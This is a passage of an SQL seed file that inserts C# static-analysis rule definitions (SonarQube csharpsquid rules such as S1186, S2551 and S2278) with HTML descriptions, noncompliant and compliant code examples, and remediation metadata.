var s1 = string.Format("{0} {1} {2}", 1, 2, 3);
var s2 = string.Format("{0}", 10);
</pre>
or
<pre>
// Fix the format string
var s1 = string.Format("{0} {1}", 1, 2);
var s2 = string.Format("{0} {1}", 10, 11);
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812167, 1510817812168, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (342, 'Methods should not be empty', 'S1186', NULL, 'csharpsquid', '<p>
There are several reasons for a method not to have a method body:
  <ul>
    <li>It is an unintentional omission, and should be fixed.</li>
    <li>It is not yet, or never will be, supported. In this case an <code>NotSupportedException</code> should be thrown.</li>
    <li>The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override.</li>
  </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public override void DoSomething()
{
}

public override void doSomethingElse()
{
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public override void DoSomething()
{
  // Do nothing because of X and Y.
}

public override void doSomethingElse()
{
  throw new NotSupportedException();
}
</pre>

<h2>Exceptions</h2>
<p>An abstract class'' may have empty methods, in order to provide default implementations for child classes.</p>
<pre>
abstract class Animal
{
  public void Speak()
  {
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'suspicious', false, 'HTML', 1510817812169, 1510817812169, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (343, 'Collapsible "if" statements should be merged', 'S1066', NULL, 'csharpsquid', '<p>
    Merging collapsible <code>if</code> statements increases the code''s readability.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (condition1)
{
  if (condition2)
  {
    ...
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
if (condition1 &amp;&amp; condition2)
{
  ...
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'clumsy', false, 'HTML', 1510817812170, 1510817812170, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (344, 'Anonymous delegates should not be used to unsubscribe from Events', 'S3244', NULL, 'csharpsquid', '<p>
    It is possible to subscribe to events with anonymous delegates, but having done so, it is impossible to unsubscribe from them.
    That''s because the process of subscribing adds the delegate to a list. The process of unsubscribing essentially says: remove
    this item from the subscription list. But because an anonymous delegate was used in both cases, the unsubscribe attempt tries
    to remove a different item from the list than was added. The result: <code>NOOP</code>.
</p>
<p>
    Instead, save the delegate to a variable and use the variable to subscribe and unsubscribe.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
listView.PreviewTextInput += (obj,args) =>
        listView_PreviewTextInput(obj,args,listView);

// ...

listView.PreviewTextInput -= (obj, args) =>
        listView_PreviewTextInput(obj, args, listView); // Noncompliant; this delegate was never subscribed
</pre>

<h2>Compliant Solution</h2>
<pre>
EventHandler func = (obj,args) => listView_PreviewTextInput(obj,args,listView);

listView.PreviewTextInput += func;

// ...

listView.PreviewTextInput -= func;
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812171, 1510817812171, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (345, 'Expressions should not be too complex', 'S1067', NULL, 'csharpsquid', '<p>
The complexity of an expression is defined by the number of <code>&&</code>, <code>||</code> and <code>condition ? ifTrue : ifFalse</code> operators it contains.<br/>
A single expression''s complexity should not become too high to keep the code readable.
</p>

<h2>Noncompliant Code Example</h2>
<p>With the default threshold value 3</p>
<pre>
if (((condition1 && condition2) || (condition3 && condition4)) && condition5) { ... }
</pre>

<h2>Compliant Solution</h2>
<pre>
if ( (myFirstCondition() || mySecondCondition()) && myLastCondition()) { ... }
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, 'brain-overload', false, 'HTML', 1510817812172, 1510817812172, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (346, 'Types and "this" should not be used for locking', 'S2551', NULL, 'csharpsquid', '<p>
    Locking on the current object instance (i.e. <code>this</code>), or on a <code>Type</code> object increases the chance
    of deadlocks because any other thread could acquire (or attempt to acquire) the same lock for another unrelated purpose.
</p>
<p>
    Instead, a new, private <code>object</code> should be created and used for the lock.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public void MyLockingMethod()
{
  lock (this) // Noncompliant
  {
    // ...
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
object lockObj = new object();

public void MyLockingMethod()
{
  lock (lockObj)
  {
    // ...
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'multi-threading', false, 'HTML', 1510817812174, 1510817812175, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (347, '"ThreadStatic" should not be used on non-static fields', 'S3005', NULL, 'csharpsquid', '<p>
    When a non-<code>static</code> class field is annotated with <code>ThreadStatic</code>, the code seems to show that the
    field can have different values for different calling threads, but that''s not the case, since the <code>ThreadStatic</code>
    attribute is simply ignored on non-<code>static</code> fields.
</p>
<p>
    So <code>ThreadStatic</code> should either be removed or replaced with a use of the <code>ThreadLocal&lt;T&gt;</code> class,
    which gives a similar behavior for non-<code>static</code> fields.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
  [ThreadStatic]  // Noncompliant
  private int count = 0;

  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
  private int count = 0;

  // ...
}
</pre>
or
<pre>
public class MyClass
{
  private readonly ThreadLocal&lt;int&gt; count = new ThreadLocal&lt;int&gt;();
  public int Count
  {
    get { return count.Value; }
    set { count.Value = value; }
  }
  // ...
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'unused', false, 'HTML', 1510817812176, 1510817812176, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (348, 'Generic type parameters should be co/contravariant when possible', 'S3246', NULL, 'csharpsquid', '<p>
    In the interests of making code as usable as possible, interfaces and delegates with generic parameters should use the
    <code>out</code> and <code>in</code> modifiers when possible to make the interfaces and delegates covariant and contravariant,
    respectively.
</p>
<p>
    The <code>out</code> keyword can be used when the type parameter is used only as a return type in the interface or delegate.
    Doing so makes the parameter covariant, and allows interface and delegate instances created with a sub-type to be used as
    instances created with a base type. The most notable example of this is <code>IEnumerable&lt;out T&gt;</code>, which allows
    the assignment of an <code>IEnumerable&lt;string&gt;</code> instance to an <code>IEnumerable&lt;object&gt;</code> variable,
    for instance.
</p>
<p>
    The <code>in</code> keyword can be used when the type parameter is used only as a method parameter in the interface or a
    parameter in the delegate. Doing so makes the parameter contravariant, and allows interface and delegate instances created
    with a base type to be used as instances created with a sub-type. I.e. this is the inversion of covariance. The most notable
    example of this is the <code>Action&lt;in T&gt;</code> delegate, which allows the assignment of an
    <code>Action&lt;object&gt;</code> instance to a <code>Action&lt;string&gt;</code> variable, for instance.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
interface IConsumer&lt;T&gt;  // Noncompliant
{
    bool Eat(T fruit);
}
</pre>

<h2>Compliant Solution</h2>
<pre>
interface IConsumer&lt;in T&gt;
{
    bool Eat(T fruit);
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'api-design', false, 'HTML', 1510817812177, 1510817812177, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (349, 'Neither DES (Data Encryption Standard) nor DESede (3DES) should be used', 'S2278', NULL, 'csharpsquid', '<p>
    According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer
    considered secure:
</p>
<blockquote>
    <p>
        Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn
        because it no longer provides the security that is needed to protect federal government information.
    </p>
    <p>
        Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS
        197 in 2001.
    </p>
</blockquote>

<h2>Noncompliant Code Example</h2>
<pre>
using (var tripleDES = new TripleDESCryptoServiceProvider()) //Noncompliant
{
  //...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
using (var aes = new AesCryptoServiceProvider())
{
  //...
}
</pre>

<h2>See</h2>

<ul>
    <li><a href="http://cwe.mitre.org/data/definitions/326.html">MITRE CWE-326</a> - Inadequate Encryption Strength</li>
    <li><a href="http://cwe.mitre.org/data/definitions/327.html">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>
    <li><a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>
    <li>Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a></li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe,owasp-a6', false, 'HTML', 1510817812178, 1510817812179, 3);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (350, 'The length returned from a stream read should be checked', 'S2674', NULL, 'csharpsquid', '<p>
    You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method with
    the number of bytes requested. Instead, you must check the value returned by the read method to see how many bytes
    were read. Fail to do so, and you introduce a bug that is both harmful and difficult to reproduce.
</p>
<p>
    This rule raises an issue when a <code>Stream.Read</code> or a <code>Stream.ReadAsync</code> method is called, but
    the return value is not checked.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public void DoSomething(string fileName)
{
  using (var stream = File.Open(fileName, FileMode.Open))
  {
    var result = new byte[stream.Length];
    stream.Read(result, 0, (int)stream.Length); // Noncompliant
    // ... do something with result
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public void DoSomething(string fileName)
{
  using (var stream = File.Open(fileName, FileMode.Open))
  {
    var buffer = new byte[1024];
    using (var ms = new MemoryStream())
    {
        int read;
        while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)
        {
            ms.Write(buffer, 0, read);
        }
        // ... do something with ms
    }
  }
}
</pre>', 4, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812179, 1510817812180, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (399, 'Default parameter values should not be passed as arguments', 'S3254', NULL, 'csharpsquid', '<p>
    Specifying the default parameter values in a method call is redundant. Such values should be omitted in the interests of readability.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public void M(int x, int y = 5, int z = 7) { /* ... */ }

// ...
M(1, 5); //Noncompliant, y has the default value
M(1, z: 7); //Noncompliant, z has the default value
</pre>

<h2>Compliant Solution</h2>
<pre>
public void M(int x, int y=5, int z = 7) { /* ... */ }

// ...
M(1);
M(1);
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812257, 1510817812257, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (351, 'Related "if/else if" statements should not have the same condition', 'S1862', NULL, 'csharpsquid', '<p>
A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first one with a condition that evaluates to <code>true</code>.
Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it''s simply dead code and at worst, it''s a bug that is likely to induce
further bugs as the code is maintained, and obviously it could lead to unexpected behavior.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();
</pre>

<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();
</pre>

<h2>See</h2>

<ul>
<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>
<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'cert,pitfall,unused', false, 'HTML', 1510817812180, 1510817812181, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (352, 'Classes should "Dispose" of members from the classes'' own "Dispose" methods', 'S2952', NULL, 'csharpsquid', '<p>
    It is possible in an <code>IDisposable</code> to call <code>Dispose</code> on class members from any method, but the
    contract of <code>Dispose</code> is that it will clean up all unmanaged resources. Move disposing of members to some
    other method, and you risk resource leaks.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void CloseResource()
  {
    this.fs.Close();
  }

  public void CleanUp()
  {
    this.fs.Dispose(); // Noncompliant; Dispose not called in class'' Dispose method
  }

  public void Dispose()
  {
    // method added to satisfy demands of interface
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class ResourceHolder : IDisposable
{
  private FileStream fs;
  public void OpenResource(string path)
  {
    this.fs = new FileStream(path, FileMode.Open);
  }
  public void CloseResource()
  {
    this.fs.Close();
  }

  public void Dispose()
  {
    this.fs.Dispose();
  }
}
</pre>

<h2>See</h2>
<ul>
    <li><a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>
</ul>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, 'cwe,denial-of-service', false, 'HTML', 1510817812182, 1510817812182, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (353, 'Classes directly extending "object" should not call "base" in "GetHashCode" or "Equals"', 'S3249', NULL, 'csharpsquid', '<p>
    Making a <code>base</code> call in an overridden method is generally a good idea, but not in <code>GetHashCode</code> and
    <code>Equals</code> for classes that directly extend <code>object</code> because those methods are based on the object reference.
    Meaning that no two <code>objects</code> that use those <code>base</code> methods will ever be equal or have the same hash.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Point
{
  private readonly int x;
  public MyClass(int x)
  {
    this.x = x;
  }
  public override int GetHashCode()
  {
    return x.GetHashCode() ^ base.GetHashCode(); //Noncompliant
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Point
{
  private readonly int x;
  public MyClass(int x)
  {
    this.x = x;
  }
  public override int GetHashCode()
  {
    return x.GetHashCode();
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    This rule doesn''t report on guard conditions checking for reference equality.
</p>
<pre>
public class Point
{
  public override bool Equals(object obj)
  {
    if (base.Equals(obj)) // Compliant, although it could be replaced with object.ReferenceEquals(obj, this), which is clearer
    {
      return true;
    }
    ...
  }
}
</pre>', 3, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817812183, 1510817812183, 2);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (354, 'Unused method parameters should be removed', 'S1172', NULL, 'csharpsquid', '<p>
    Unused parameters are misleading. Whatever the value passed to such parameters is, the behavior will be the same.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
void DoSomething(int a, int b) // "b" is unused
{
  Compute(a);
}
</pre>

<h2>Compliant Solution</h2>
<pre>
void DoSomething(int a)
{
  Compute(a);
}
</pre>

<h2>Exceptions</h2>
<p>
    <code>virtual</code>, <code>override</code> methods and interface implementations are ignored.
</p>
<pre>
override void DoSomething(int a, int b) // no issue reported on b
{
  Compute(a);
}
</pre>

<p>
    Furthermore, the <code>this</code> parameter of extension methods is also ignored.
</p>
<pre>
public static class Extensions
{
  public static void MyHelper(this HtmlHelper helper) //no issue reported here
  {
    // no use of helper here
  }
}
</pre>

<p>
    Methods that have attributes defined on them are also ignored.
</p>
<pre>
public class MyDto
{
  public string Name { get; set; }

  [OnDeserialized]
  private void OnDeserialized(StreamingContext context)
  {
    // ...
  }
}
</pre>

<h2>See</h2>

<ul>
    <li>MISRA C++:2008, 0-1-11</li>
    <li>MISRA C:2012, 2.7</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'misra,unused', false, 'HTML', 1510817812184, 1510817812185, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (355, 'Constructors should only call non-overridable methods', 'S1699', NULL, 'csharpsquid', '<p>
    Calling an overridable method from a constructor could result in failures or strange behaviors when instantiating a subclass which overrides the method.
</p>
<p>
    For example:
</p>
<ul>
    <li>The subclass class constructor starts by calling the parent class constructor.</li>
    <li>The parent class constructor calls the method, which has been overridden in the child class.</li>
    <li>
        If the behavior of the child class method depends on fields that are initialized in the child class constructor,
        unexpected behavior (like a <code>NullReferenceException</code>) can result, because the fields aren''t initialized yet.
    </li>
</ul>

<h2>Noncompliant Code Example</h2>
<pre>
public class Parent
{
  public Parent()
  {
    DoSomething();  // Noncompliant
  }

  public virtual void DoSomething() // can be overridden
  {
    ...
  }
}

public class Child : Parent
{
  private string foo;

  public Child(string foo) // leads to call DoSomething() in Parent constructor which triggers a NullReferenceException as foo has not yet been initialized
  {
    this.foo = foo;
  }

  public override void DoSomething()
  {
    Console.WriteLine(this.foo.Length);
  }
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812186, 1510817812187, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (360, '"GC.SuppressFinalize" should not be invoked for types without destructors', 'S3234', NULL, 'csharpsquid', '<p>
    <code>GC.SuppressFinalize</code> asks the Common Language Runtime not to call the finalizer of an object. This is useful when
    implementing the dispose pattern where object finalization is already handled in <code>IDisposable.Dispose</code>. However, it
    has no effect if there is no finalizer defined in the object''s type, so using it in such cases is just confusing.
</p>
<p>
    This rule raises an issue when <code>GC.SuppressFinalize</code> is called for objects of <code>sealed</code> types without a finalizer.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
sealed class MyClass
{
  public void Method()
  {
    ...
    GC.SuppressFinalize(this); //Noncompliant
  }
}
</pre>

<h2>Compliant Solution</h2>
<pre>
sealed class MyClass
{
  public void Method()
  {
    ...
  }
}
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'confusing,unused', false, 'HTML', 1510817812192, 1510817812193, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (356, 'Dead stores should be removed', 'S1854', NULL, 'csharpsquid', '<p>
    A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction.
    Calculating or retrieving a value only to then overwrite it or throw it away, could indicate a serious error in
    the code. Even if it''s not an error, it is at best a waste of resources. Therefore all calculated values should be used.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
void CalculateRate(int a, int b)
{
  int i;

  i = a + b; // Noncompliant; calculation result not used before value is overwritten
  i = DoSomething();  // Noncompliant; retrieved value not used
  for (i = 0; i &lt; 10; i++)
  {
    //  ...
  }
  // ...
}
</pre>

<h2>Compliant Solution</h2>
<pre>
void CalculateRate(int a, int b)
{
  int i;

  i = DoSomething();
  i += a + b;
  StoreI(i)

  for (i = 0; i &lt; 10; i++)
  {
    //  ...
  }
}
</pre>

<h2>Exceptions</h2>
<p>
    No issue is reported on statements inside <code>try</code> blocks.
</p>

<h2>See</h2>

<ul>
    <li><a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use (''Unused Variable'')</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C</a> - Detect and remove unused values</li>
    <li><a href="https://www.securecoding.cert.org/confluence/x/S4IyAQ">CERT, MSC13-CPP</a> - Detect and remove unused values</li>
</ul>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'cert,cwe,suspicious,unused', false, 'HTML', 1510817812188, 1510817812188, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (357, '"async" and "await" should not be used as identifiers', 'S2306', NULL, 'csharpsquid', '<p>
Since C# 5.0, <code>async</code> and <code>await</code> are contextual keywords.
Contextual keywords do have a particular meaning in some contexts, but can still be used as variable names for example.
Keywords, on the other hand, are always reserved, and therefore are not valid variable names.
To avoid any confusion though, it is best to not use <code>async</code> and <code>await</code> as identifiers.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
int await = 42; // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
int someOtherName = 42;
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'pitfall', false, 'HTML', 1510817812189, 1510817812189, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (358, '"ToString()" calls should not be redundant', 'S1858', NULL, 'csharpsquid', '<p>
    Invoking a method designed to return a string representation of an object which is already a string is a waste of
    keystrokes. Similarly, explicitly invoking <code>ToString()</code> when the compiler would do it implicitly is also
    needless code-bloat.
</p>
<p>
    This rule raises an issue when <code>ToString()</code> is invoked:
    <ul>
        <li>on a <code>string</code></li>
        <li>on a non-<code>string</code> operand to concatenation</li>
        <li>on an argument to <code>string.Format</code></li>
    </ul>
</p>

<h2>Noncompliant Code Example</h2>
<pre>
var s = "foo";
var t = "fee fie foe " + s.ToString();  // Noncompliant
var u = "" + 1.ToString(); // Noncompliant
var v = string.Format("{0}", 1.ToString()); // Noncompliant
</pre>

<h2>Compliant Solution</h2>
<pre>
var s = "foo";
var t = "fee fie foe " + s;
var u = "" + 1;
var v = string.Format("{0}", 1);
</pre>', 1, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, 'clumsy,finding', false, 'HTML', 1510817812190, 1510817812190, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (359, 'Child class members should not shadow parent class members', 'S2387', NULL, 'csharpsquid', '<p>
    Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy
    and you''ll get confusion at best, chaos at worst. Perhaps even worse is the case where a child class field varies from
    the name of a parent class only by case.
</p>
<p>
    This rule ignores <code>private</code> parent class members, but in all other such cases, the child class field should
    be renamed.
</p>

<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit
{
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry : Fruit
{
  private bool ripe;  // Noncompliant
  private static Color FLESH; // Noncompliant
}
</pre>

<h2>Compliant Solution</h2>
<pre>
public class Fruit
{
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry : Fruit
{
  private bool ripened;
  private static Color FLESH_COLOR;
}
</pre>', 2, NULL, 'READY', 'cs', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, 'confusing', false, 'HTML', 1510817812191, 1510817812192, 1);
